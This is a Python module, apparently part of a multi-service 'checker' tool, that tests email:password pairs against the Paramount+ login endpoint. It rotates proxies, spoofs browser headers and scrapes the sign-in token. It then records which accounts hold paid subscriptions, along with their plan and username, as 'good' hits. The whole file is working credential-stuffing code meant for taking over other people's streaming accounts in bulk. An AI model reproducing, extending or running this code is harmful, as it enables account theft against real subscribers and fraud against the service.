from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = "email={}&password={}&tk_trp={}"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded" ,
            "accept": "application/json, text/plain, */*" ,
            "accept-encoding": "gzip, deflate, br" ,
            "accept-language": "fr-FR,fr;q=0.9" ,
            "origin": "https://www.paramountplus.com" ,
            "referer": "https://www.paramountplus.com/account/signin/" ,
            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-origin" ,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" ,
            "x-requested-with": "XMLHttpRequest"
        }
        try:
            tk = get("https://www.paramountplus.com/account/signin/",proxies=proxy_set,timeout=Checker.timeout).text.split('"tk_trp":"')[1].split('"')[0]
            headers["Content-Length"] = str(len(data.format(email,password,tk)))
            response = post("https://www.paramountplus.com/account/xhr/login/",headers=headers,data=data.format(email,password,tk),proxies=proxy_set,timeout=Checker.timeout)
            if "Invalid" in response.text or "\"success\":false" in response.text:
                retries += 1
            elif "isSubscriber" in response.text:
                data = response.json()
                subscribed = data["user"]["isSubscriber"]
                if subscribed:
                    subscription = data["user"]["svod"]["user_package"]["code"].replace("_"," ").lower().title()
                    plan = data["user"]["svod"]["user_package"]["plan_type"].title()
                    username = data["displayName"]

                    if not Checker.cui:
                        log("good",email+":"+password,"Paramount")
                    save("Paramount","good",Checker.time,email+":"+password+f" | Subscription: {subscription} | Plan {plan} | Username: {username}")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
                else:
                    if not Checker.cui:
                        log("custom",email+":"+password,"Paramount")
                    save("Paramount","custom",Checker.time,email+":"+password)
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return
